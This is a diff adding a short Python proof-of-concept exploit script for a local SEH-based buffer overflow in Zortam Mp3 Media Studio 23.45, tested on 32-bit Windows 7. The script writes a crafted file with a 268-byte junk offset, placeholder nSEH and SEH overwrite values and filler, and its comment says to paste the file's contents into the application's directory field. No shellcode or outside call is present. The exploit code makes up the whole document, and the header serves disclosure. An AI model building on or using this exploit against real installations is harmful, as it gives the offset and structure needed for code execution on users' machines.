@@ -1,0 +1,22 @@
+#!/usr/bin/python
+# Title: Zortam Mp3 Media Studio Local Buffer Overflow (SEH)
+# Author: Kevin McGuigan
+# Twitter: @_h3xagram
+# Author Website: https://www.7elements.co.uk
+# Vendor Website: http://www.zortam.com/
+# Version: 23.45
+# Tested on: Windows 7 32 bit
+# Date: 12/04/2018
+# Vendor did not respond to advisory
+
+
+# File > Add Disk to Mp3 Library > paste string from zortamPOC.txt into directory field
+filename="zortamPOC.txt"
+junk = "A" * 268
+nseh = "B" * 4
+seh="C" * 4
+fill = "D" *900
+buffer = junk + nseh + seh + fill
+textfile = open(filename , 'w')
+textfile.write(buffer)
+textfile.close()
